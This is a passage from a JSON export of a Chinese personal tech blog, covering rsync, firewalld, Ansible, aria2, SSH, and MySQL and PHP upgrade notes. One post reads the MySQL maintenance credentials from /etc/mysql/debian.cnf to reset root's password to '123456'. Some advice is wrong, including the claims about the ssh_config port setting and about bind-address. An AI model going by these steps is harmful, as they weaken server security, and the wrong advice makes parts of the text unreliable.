--recursive：递归到目录中去。 -t --times：保持mtime属性。强烈建议任何时候都加上\"-t\"，否则目标文件mtime会设置为系统时间，导致下次更新 ：检查出mtime不同从而导致增量传输无效。-o --owner：保持owner属性(属主)。 -g --group：保持group属性(属组)。 -p --perms：保持perms属性(权限，不包括特殊权限)。 -D ：是\"--device --specials\"选项的组合，即也拷贝设备文件和特殊文件。 -l --links：如果文件是软链接文件，则拷贝软链接本身而非软链接所指向的对象。 -z ：传输时进行压缩提高效率。 -R --relative：使用相对路径。意味着将命令行中指定的全路径而非路径最尾部的文件名发送给服务端，包括它们的属性。用法见下文示例。 --size-only ：默认算法是检查文件大小和mtime不同的文件，使用此选项将只检查文件大小。 -u --update ：仅在源mtime比目标已存在文件的mtime新时才拷贝。注意，该选项是接收端判断的，不会影响删除行为。 -d --dirs ：以不递归的方式拷贝目录本身。默认递归时，如果源为\"dir1/file1\"，则不会拷贝dir1目录，使用该选项将拷贝dir1但不拷贝file1。 --max-size ：限制rsync传输的最大文件大小。可以使用单位后缀，还可以是一个小数值(例如：\"--max-size=1.5m\") --min-size ：限制rsync传输的最小文件大小。这可以用于禁止传输小文件或那些垃圾文件。 --exclude ：指定排除规则来排除不需要传输的文件。 --delete ：以SRC为主，对DEST进行同步。多则删之，少则补之。注意\"--delete\"是在接收端执行的，所以它是在 ：exclude/include规则生效之后才执行的。 -b --backup ：对目标上已存在的文件做一个备份，备份的文件名后默认使用\"~\"做后缀。 --backup-dir：指定备份文件的保存路径。不指定时默认和待备份文件保存在同一目录下。 -e ：指定所要使用的远程shell程序，默认为ssh。 --port ：连接daemon时使用的端口号，默认为873端口。 --password-file：daemon模式时的密码文件，可以从中读取密码实现非交互式。注意，这不是远程shell认证的密码，而是rsync模块认证的密码。 -W --whole-file：rsync将不再使用增量传输，而是全量传输。在网络带宽高于磁盘带宽时，该选项比增量传输更高效。 --existing ：要求只更新目标端已存在的文件，目标端还不存在的文件不传输。注意，使用相对路径时如果上层目录不存在也不会传输。 --ignore-existing：要求只更新目标端不存在的文件。和\"--existing\"结合使用有特殊功能，见下文示例。 --remove-source-files：要求删除源端已经成功传输的文件。","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7","slug":"CentOS7","date":"2019-07-09T14:36:30.000Z","updated":"2021-04-02T02:15:38.153Z","comments":true,"path":"2019/07/09/CentOS7/","link":"","permalink":"https://tari.moe/2019/07/09/CentOS7/","excerpt":"","text":"我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)CentOS 6 和 CentOS 7 在华为平台上的两个主要区别 CentOS6： 支持快照； 采用sysvinit，服务启动稍慢，fstab和nfs挂载容易出现问题。 CentOS7： 不支持快照，需要自己备份； 采用systemed，设计目标是克服sysvinit的缺点。 firewalld &amp;&amp; firewall-cmd新安装好 nginx 的我兴致勃勃的输入我的ip, 结果…. 于是我检查 服务状态, 配置文件 和 日志文件 好像在 Ubuntu 上都是一样呀..然后发现了 CentOS7 的防火墙默认只开启 ssh 服务 1firewall-cmd --list-services 那怎么去开启一个端口呢? 这里用 80 端口举例 1234firewall-cmd --zone=public --add-port=80/tcp --permanent # （--permanent永久生效，没有此参数重启后失效）firewall-cmd --reload # 重新载入firewall-cmd --zone=public --query-port=80/tcp # 查看 80 端口firewall-cmd --zone=public --remove-port=80/tcp --permanent # 关闭 80 端口 然后就可以正常访问 nginx 啦! 于是又想起许多防火墙是通过 iptables 去管理的, 顺便到 Red Hat 官方文档 gup 了一下 发现在 RHEL7 系统中, 系统默认是自带 firewall 的, 并且默认关闭开启80端口 值得一提的是 firewall 调用 iptables 的相关命令. 想要详细了解可以参考 liitdar的博客","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"初识 ansible (三)","slug":"初识-ansible-3","date":"2019-07-08T13:37:12.000Z","updated":"2021-04-02T02:28:28.341Z","comments":true,"path":"2019/07/08/初识-ansible-3/","link":"","permalink":"https://tari.moe/2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/","excerpt":"","text":"模板 templatesJinja2语言 算数运算: //(取整) 建议放在ansible目录下, 创建一个 templates 文件夹 模板文件后缀 .j2 配置文件变量用 {{ }} 括起来 with_items 迭代对迭代项的引用， 固定变量名为 “item”要在 task 中使用 with_items 给定要迭代的元素列表列表格式: 字符串 或 字典 12345678910111213---- hosts: all remote_user: root vars_files: - vars.yml tasks: - name: unarchive unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes with_items: - test1.tar.gz - test2.tar.gz - test3.tar.gz playbook -&gt; template 中的 for 和 if12345678910111213141516171819# for&#123;% for vhost in nginx_vhosts %&#125;&#123;% endraw %&#125;server &#123; listen &#123;&#123; vhost.listen | default(&#39;80 default_server&#39; ) &#125;&#125;;&#125;&#123;% endfor %&#125;# if&#123;% if vhost.server_name is defined %&#125;server_name &#123; &#123;&#123; vhost.server_name &#125;&#125;;&#125;&#123;% endif %&#125;# if&#123;% if vhost.server_name is defined %&#125;root &#123;&#123; vhost.root &#125;&#125;;&#123;% endif %&#125; for 循环举例.conf.j2 文件 1234567&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;; servername &#123;&#123; p.name &#125;&#125;; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml 文件 123456789101112131415161718192021---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 name: web1.site.com rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 name: web3.site.com rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf if 判断举例.conf.j2 文件 1234567891011&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;;&#123;% if p.name is defined %&#125; servername &#123;&#123; p.name &#125;&#125;;&#123;% endif %&#125; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml 文件 12345678910111213141516171819---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf roles 角色roles 使得 playbook 模块化，并且在模块中的 - include roles/path 中的roles为 /etc/ansible/ 路径下的 roles. roles 的目录树结构如下图所示 (其中的main.yml 类似于入口函数, 负责按照一定顺序调用各个模块): 如果上图中的 nginx 角色要调用不同角色的文件, 需要 - include roles/角色/tasks/某某.yml 角色标签roles: { role: nginx, tages:[‘web’, ‘nginx’]}","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"初识 ansible (二)","slug":"初识-ansible-2","date":"2019-07-08T05:42:59.000Z","updated":"2021-04-02T02:28:38.102Z","comments":true,"path":"2019/07/08/初识-ansible-2/","link":"","permalink":"https://tari.moe/2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/","excerpt":"","text":"ansible 常用模块 Command: 在远程主机执行命令, 默认模块, 可忽略 -m 选项ansible all (-m command) -a ‘service nginx restart’此命令不支持 $VARNAME &lt; &gt; | ; &amp; *等, 用 shell 模块实现 Shell: -a 参数尽量放到单引号中!ansible all -m shell -a ‘echo pass | passwd -stdin user’调用bash执行命令 蕾西 cat /tmp/stanley.md | awk -F ‘|’ ‘print $1,$2’ &amp;&gt; /tmp/example.txt这些复杂命令, 即使使用 shell 也可能会失败, 解决办法: 写到脚本时, copy到远程, 执行. 再把需要的结果拉回执行命令的机器 Script: 运行脚本 -a “/PATH/TO/SCRIPT_FILE”ansible all -m script -a shel.sh ansible-vault 加密解密123456789ansible-vault encrypt file.yml ansible-vault decrypt file.yml ansible-vault edit file.yml ansible-vault view file.yml ansible-vault reykey file.yml ansible-console 交互YAML 语法在单一档案中, 可用连续三个连字号(—)区分多个档案. 另外, 还有选择性的连续三个点好(…)用来表示档案结尾风格和python类似一个完整代码功能需最少元素包含 name: task module: arguments (arguments 一般是 key=value)拓展名通常为 yml 或 yaml 模板: - hosts: websrvs remote_user: root tasks: - name: test connection ping: ansible目录下 vars.yml 专用于存放变量 ansible-playbook 运行 playbook 的方式 ansible-playbook &lt;filename.yml&gt; … [options] -check 检查 –list-hosts 列出运行任务的主机 –limit 只针对主机列表中的主机执行 -v 显示过程 -vv -vvv 更详细 一个模块只对应一个内容 如下: task : - name: copy file1 copy: src=file1 dest=/path/ copy: src=file2 dest=/path/ 这样只会 copy file2 顺便记下 backup 参数, backup=yes 会在复制前备份一个, 防止覆盖.备份的文件名是: 文件名_随机数_时间 ignore_errors 即使途中出错也会继续运行: tasks: - name: rum and ignore the result shell: ... ignore_errors: True handlers 与 notify 触发事件 handlers 用于当关注的资源发生变化时, 才会才会采取一定的操作 notify 调用 handler 中定义的操作 handlers 与 tasks 同级, 并且 notify 名字需要与 handlers 中的 name 名字相同 hosts: websrvs remote_user: root tasks: - name: add group nginx user: name=nginx state=present - name: add user nginx user: name=nginx state=present group=nginx - name: install Nginx yum: name=nginx state=present notify: - restart Nginx - check Nginx process handlers: - name: restart Nginx service: name=nginx state=restartd enabled=yes - name: check Nginx process shell: killall -0 nginx tags 标签 可以单独只执行标签多个动作可以公用一个标签 1ansible-playbook -t 标签 文件.yml 变量的使用 ansible setup facts 远程主机的所有变量都可直接调用 ansible all -m setup 查看所有系统自带变量 在 /etc/ansible/hosts 中定义 普通变量: 主机组中主机单独定义, 优先级高于公共变量 如: [websrvs] 192.168.22.33 http_port=81 192.168.22.34 http_port=82 公共(组)变量: 针对主机组中所有主机定义统一变量 如: [websrvs:vars] nodename=www domainname=example.com 通过命令行制定变量, 优先级最高 如: ansible-playbook -e varname=value 在 playbook 中定义 vars:\\- var1:value1 \\- var12:value2 在 role 中定义","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"Motrix + aria2 踩坑","slug":"Motrix+aria2_踩坑","date":"2019-07-07T16:11:33.000Z","updated":"2021-04-02T02:25:11.842Z","comments":true,"path":"2019/07/08/Motrix+aria2_踩坑/","link":"","permalink":"https://tari.moe/2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/","excerpt":"","text":"案发前: 被 騷亂時節的少女們 的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…然后就完全忘了看番这件事了….. Motrix(1.4.1) + aria2(1.34.0)突然觉得百度云盘直接用web端会方便很多,于是想尝试着去使用 Motrix + aria2 + BaiduExporter 的组合, 然后就掉坑了…. Motrix 官网下载就好啦!编译安装最新版本滴 aria2解压进入目录编译安装一条龙…(记得切换位root用户,不然安装时有可能提示权限不够)预编译也不需要加其他拓展,默认就OK啦! 1234sudo sutar &amp;&amp; cd &amp;&amp; ./configuremakemake install 配置继续保持root用户, 方便操作配置文件目录任意, 但要保持下面的path都在同一path .session 文件一定要有喔!aria2.conf 的配置可以参考下我滴 12mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.sessionvim /path/aria2.conf 配置完成就可以使用啦!(才怪)要么你是root用户, 不然启动 aria2c 一定记得加 sudo!! 我就被坑了…emmm 1234sudo aria2c --conf-path=/path/aria2/aria2.conf# 这个是在后台运行, 还没下载成功之前建议用上面的, 方便查看运行结果sudo aria2c --conf-path=/path/aria2/aria2.conf -D 安装 BaiduExporter(我使用的是0.8.5)记得安装最新版本, 我就因为没安装最新版本, 他原本对 pan.baidu.com 之类的域名是没有授权, 导致aria2访问不到, 哭死…仔细看README.MD的重要性…. 随便找个可以下载百度云的链接打开, 看到 MO.app 在 保存到网盘 下载等按钮附件就知道插件安装成功啦!!(记得在chrome拓展看看有没有报错, 报错要重装喔!) 说说 MO.app 里面 设置 里面主要字段的含义吧! RPC地址使用MO下载: 就是下载按钮的名字啦!后面跟着的内容在README.ME有说, 我的是http://token:(在motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret 里面的内容)@localhost:16800/jsonrpc User-Agent在 Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent 选择 du Referer保持默认的 https://pan.baidu.com/disk/home 就好啦! Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!我踩滴坑一107/07 22:22:06 [ERROR] Failed to serialize session to &#x27;/etc/aria2/aria2.session&#x27;. 这个主要是因为我没有用 sudo 运行 aria2c 二123456707/07 23:46:37 [ERROR] CUID#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4 -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 The response status is not successful. status=40307/07 23:46:37 [NOTICE] Download GID#2384700d4e908591 not complete: /home/tari/Downloads/回顾视频.mp4 这个主要是因为我插件关于百度云盘的域名授权问题, 保持好插件最新版本就好啦!","categories":[{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"日常折腾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"日常折腾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"}],"tags":[{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"Motrix","permalink":"https://tari.moe/tags/Motrix/"},{"name":"aria2","slug":"aria2","permalink":"https://tari.moe/tags/aria2/"}]},{"title":"about ssh","slug":"ssh","date":"2019-07-06T12:44:05.000Z","updated":"2021-04-02T02:27:18.059Z","comments":true,"path":"2019/07/06/ssh/","link":"","permalink":"https://tari.moe/2019/07/06/ssh/","excerpt":"","text":"/etc/hosts.deny 禁用无效原因：编译安装时默认没有加载libwrap库 [转载自 良许Linux] Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。下面我们来介绍 SSH 的 7 大用法。 基本用法最简单的用法就是不带参数，仅输入 ssh 再加上主机地址，比如： ssh 192.168.0.116这种形式登陆主机，会默认使用当前用户进行登录。第一次连接的时候，SSH 会确认目标主机的真实性，如果没有问题的话，输入 yes 即可。 如果我们想要以指定用户名来登录主机，有两种方法： a. 使用 -l 选项 1ssh -l alvin 192.168.0.116 b. 使用 user@hostname 格式 1ssh alvin@192.168.0.116 这两种方法，其中第二种尤为常用。 指定端口登录SSH 默认使用的端口号是 22。大多现代的 Linux 系统 22 端口都是开放的。如果你运行 ssh 程序而没有指定端口号，它直接就是通过 22 端口发送请求的。 如果我们不想通过 22 端口登录，那么我们可以使用 -p 选项来指定端口。 1ssh 192.168.0.116 -p 1234 引申话题：如何修改端口号？只需修改 /etc/ssh/ssh_config ，修改如下一行： 1Port 22 对所有数据请求压缩使用 -C 选项，所有通过 SSH 发送或接收的数据将会被压缩，并且任然是加密的。 1ssh -C 192.168.0.116 但是，这个选项在网速不是很快的时候比较有用，而当网速较快的时候，使用压缩反而会降低效率，所以要视情况使用。 打开调试模式因为某些原因，我们想要追踪调试我们建立的 SSH 连接情况。SSH 提供的 -v 选项参数正是为此而设的。其可以看到在哪个环节出了问题。 12345678910111213[Alvin.Alvin-computer] ➤ ssh -v pi@192.168.0.116OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014debug1: Reading configuration data /etc/ssh_configdebug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.debug1: Connection established.debug1: key_load_public: No such file or directorydebug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_7.1debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000debug1: Authenticating to 192.168.0.116:22 as &#x27;pi&#x27;debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT received 绑定源地址如果你的客户端有多于两个以上的 IP 地址，你就不可能分得清楚在使用哪一个 IP 连接到 SSH 服务器。为了解决这种情况，我们可以使用 -b 选项来指定一个IP 地址。这个 IP 将会被使用做建立连接的源地址。 12345678910[Alvin.Alvin-computer] ➤ ssh -b 192.168.0.105 pi@192.168.0.116Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7lThe programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105 远程执行命令如果我们想在目标主机执行一条命令，我们通常的做法是，先登录到目标主机，执行命令，再退出来。这样做当然是可以，但是比较麻烦。 如果我们仅仅是想远程执行一条命令，可以直接在后面跟上命令就好，如下： 123456[Alvin.Alvin-computer] ➤ ssh pi@192.168.0.116 ls -lDesktopDocumentsDownloadsMagPiMusic 挂载远程文件系统另外一个很赞的基于 SSH 的工具叫 sshfs。 sshfs 可以让你在本地直接挂载远程主机的文件系统。它的使用格式如下： 1sshfs -o idmap=user user@hostname:/home/user ~/Remote 比如： 1sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi 这个命令可以将远程主机 pi 用户的主目录挂载到本地主目录下的 Pi 文件夹。 类似文章良许Linux 排除Linux机器是否被入侵","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"SSH","permalink":"https://tari.moe/tags/SSH/"}]},{"title":"初识 ansible (一)","slug":"初识-ansible-1","date":"2019-07-06T01:03:58.000Z","updated":"2021-04-02T02:28:41.835Z","comments":true,"path":"2019/07/06/初识-ansible-1/","link":"","permalink":"https://tari.moe/2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/","excerpt":"","text":"个人踩滴小坑要注意下下, 一些参数的含义是什么, 好比我调用 script 模块, 想把脚本调用到目标服务器去执行 12- name: backup base system version script: /baseVersionBackup.sh 传入脚本参数1, 2, 3.... “机智” 的我以为这是到对方服务器的根目录执行脚本….emmmmmm** 注意 chdir 是脚本在对方服务器执行的目录, baseVersionBackup.sh 是你本机脚本的位置 ** 123# 正确操作- name: backup base system version script: chdir=/ baseVersionBackup.sh 传入脚本参数1, 2, 3.... ansible: 基于key的验证是一基本要求特性: 模块化 有Paramiko, PyYAML, Jinja2(模块语言)三个关键模块 支持自定义模块 基于python实现 部署简单，基于python和ssh(默认已安装), agentless 安全, 基于OpenSSH 支持playbook编排任务 幂等性: 一个任务执行一遍和执行n遍, 不因重复执行带来意外情况 无需代理不依赖PKI(无需ssl) 可使用任何变成语言写模块 YAML格式，编排任务，支持丰富的数据结构 较强大的多层解决方案 配置文件 /etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性(一般保持默认) 为什么我执行的ansible指令对方就能执行？(tmp执行完会删除) 脚本的临时目录:remote_tmp = ~/.ansible/tmplocal_tmp = ~/.ansible/tmp forks 并发执行 poll_interval 多长时间去拉一次数据 sudo_user 默认用户 ask_sudo_pass 是否询问口令 ask_pass 是否支持口令 host_key_checking 是否检查对应服务器的host_key, 建议取消注释 log_path 日志建议打开 /etc/ansible/hosts 主机清单 分组: [webserver] # 写域名需要借助dns去解析 10.10.0.1[18:20] 10.10.0.92:8080 www[01:100].example.com db-[a:f].example.com ssh基于key验证: ssh-keygen 输入完后加一下秘钥 ssh-copy-id ip地址 Host-pattern: ALL、通配符* 或关系，如: ansible “group1:group2” 或者 ansible “ip1:ip2” 与关系，如: ansible “group1:&amp;group2” 两个组都在的主机 非关系，如: ansible “group1:!group2” 在组1不在组2 综合关系,如: ansible “group1:group2:&amp;group3:!group4” 正则表达式 “~(web|file).*\\.fosu\\.com” /etc/ansible/roles/ 存放角色的目录 程序 /usr/bin/ansible 主程序，临时命令执行工具 –version -m 模块 默认command 例如ping -a 模块参数 -v -vv -vvv –list-hosts 显示主机列表 -k 提示输入ssh连接密码，默认Key验证 -K 提示输入sudo时的口令 -C 检查，并不执行 -T TIMEOUT 默认10s -u 执行远程执行的用户 -b sudo /usr/bin/ansible-doc 查看配置文档，模块功能查看工具 -a 可以列出当前模块列表，很多… -l 比较常用 ansible-doc -l ping -s 片段解释 执行过程: 1.加载自己的配置文件 默认/etc/ansible/ansible.cfg 2.加载自己对应的模块文件,如command 3.通过ansible将模块或命令生成对应的临时py文件并将该文件传输至远程服务器的对应执行用户 $HOME/.ansible/tmp/ansible-tmp-数组/xxx.py文件 4.给文件+x执行 5.执行并返回结果 6.删除临时py文件, sleep 0退出 执行状态: 绿色:执行成功并且不需要做改变的操作 黄色:执行成功并且对目标主机做变更 红色:执行失败 /usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台 /usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull远程执行命令工具 /usr/bin/ansible-valut 文件加密工具 /usr/bin/ansible-console 基于Console界面与用户交互的执行工具 自动化运维应用场景 文件传输 命令执行 应用部署 配置管理 任务流编排 工具： Ansible 适合中小型企业 Puppet 适合大型公司，例如谷歌 相关概念：代码发布机(堡垒机)通常存在发布环境中：负责把在开发完成经测试没问题后发布到生产环境中通常需要2台(主备)","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"MySQL upgrade, from 5.5.* to 5.7.*","slug":"MySQL_upgrade_from_5.5.*_to_5.7.*","date":"2019-07-02T18:16:54.000Z","updated":"2021-04-02T02:17:19.290Z","comments":true,"path":"2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/","link":"","permalink":"https://tari.moe/2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/","excerpt":"","text":"服务器版本 Ubuntu14.04备份(快照)日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )介绍一个简单修改数据库密码的方法 1sudo cat /etc/mysql/debian.cnf 红线选中部分为我本地mysql的用户和密码(password部分每个人不同的喔!)存在mysql的debian-sys-maint用户和密码,那他们是怎么来的呢? 先假科普一波, 正如它的字面意思（Debian System Matainence），Debian系统对MySQL维护用的，你可以理解为通过系统的某个 “非常规” 程序对Mysql进行备份恢复等行为时，该程序所使用的登录Mysql的账户。 使用以上账号密码登录至mysql执行下面三条命令就可以把密码更改为 123456啦! 1234567use mysql;update user set authentication_string=password(&#x27;123456&#x27;) where user=&#x27;root&#x27;;update user set plugin=&#x27;mysql_native_password&#x27;;flush privileges; 登录验证下即可 1mysql -u root -p 开始升级至5.7.*默认情况下，apt是无法直接升级到mysql5.7的，因此需要额外设置 首先，备份数据，尽管下面的方式不会丢失你的数据，但是为了安全考虑，建议备份。 下载mysql-apt的配置包，并安装 123wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.debsudo dpkg -i mysql-apt-config_0.8.1-1_all.deb 在安装的过程中，会要求选择mysql版本，选择mysql5.7版本后，点击“OK”。 更新源并安装数据库，在安装过程中，会自动卸载已经安装的老版本数据。 1sudo apt-get update &amp;&amp; sudo apt-get install mysql-server 安装 mysql 后，使用mysql_upgrade升级数据库文件版本(必须是root用户喔!) 1sudo mysql_upgrade -uroot -p 重启mysql,并检查数据是否正常 123sudo service mysql restartmysqlcheck -uroot -p --all-databases 如果一切正常，所有表的检查结果均是ok状态。 同时，也可以进入mysql使用select version()； 来查看mysql-server 版本号。 更新过程中遇到的问题： 在ubuntu 14的版本中，安装了mysql 后，启动时，程序提示 “No directory, logging in with HOME=/”。 具体如下： 12345678root@xxx:/etc/mysql# service mysql restart \\* Stopping MySQL Community Server 5.7.11... \\* MySQL Community Server 5.7.11 is stopped \\* Re-starting MySQL Community Server 5.7.11No directory, logging in with HOME=/.. \\* MySQL Community Server 5.7.11 is started 解决办法： 123sudo service MySQL stopsudo usermod -d /var/lib/mysql/ mysqlsudo service mysql start 更新mysql版本后，所有的配置文件都会被删除，因此需要修改mysql配置说人话就是，远程是访问不到本数据库的 把 /etc/mysql/mysql.conf.d/mysql.cnf 配置文件中#bind-address =127.0.0.1 的注释符号去掉即可","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP upgrade, from 5.5.* to 7.2.*","slug":"PHP_upgrade_from_5.5.*_to_7.2.24","date":"2019-07-02T17:16:24.000Z","updated":"2021-04-02T02:17:38.948Z","comments":true,"path":"2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/","link":"","permalink":"https://tari.moe/2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/","excerpt":"","text":"服务器版本 CentOS6备份(快照)首先卸载当前版本PHP1sudo yum remove php* 配置yum仓库在CentOS6/7升级PHP至7.* 需要开启Remi和EPEL仓库 123yum install epel-releaserpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装PHP7.2需要在yum中指定需要使用的相关仓库 1yum --enablerepo=remi-php72 install php 安装完成后检查 PHP 版本 1php -v 安装相关 PHP 模块1yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm 这里有个小坑,我在安装php-gd的时候会弹出一下错误 123Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe) Requires: libwebp.so.5()(64bit) You could try using --skip-broken to work around the problem 谷歌libwebp.so.5()(64bit)这个依赖项后发现以下两个链接 https://pkgs.org/download/libwebp.so.5()(64bit)https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html 于是顺势找到rpm包链接 http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm 安装它就好 1rpm -i it 接下来就可以启动php-fpm并设置为开机启动啦! 123sudo service php-fpm startchkconfig php-fpm on 如果需要,也把mysql服务装上,顺便启用它 123yum --enablerepo=remi-php72 install php-mysqlsudo service mysql restart","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"「形容詞」","slug":"「形容詞」","date":"2019-07-02T10:38:27.000Z","updated":"2021-04-02T02:13:31.280Z","comments":true,"path":"2019/07/02/「形容詞」/","link":"","permalink":"https://tari.moe/2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"「な形容詞」 「な形容詞」+ な + 名词 ，因此称为「な形容詞」&nbsp; 名词 + の + 名词 にぎやか：热闹的 「い形容詞」特徴：〜い い形容詞 + 名词例：大きい会社 肯定行 否定行 〜います 〜 **い**くないです 寒いです 寒くないです 辛い 暖かい 暑い （食べ）たいです","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"vsftpd upgrade, from 2.2.2 to 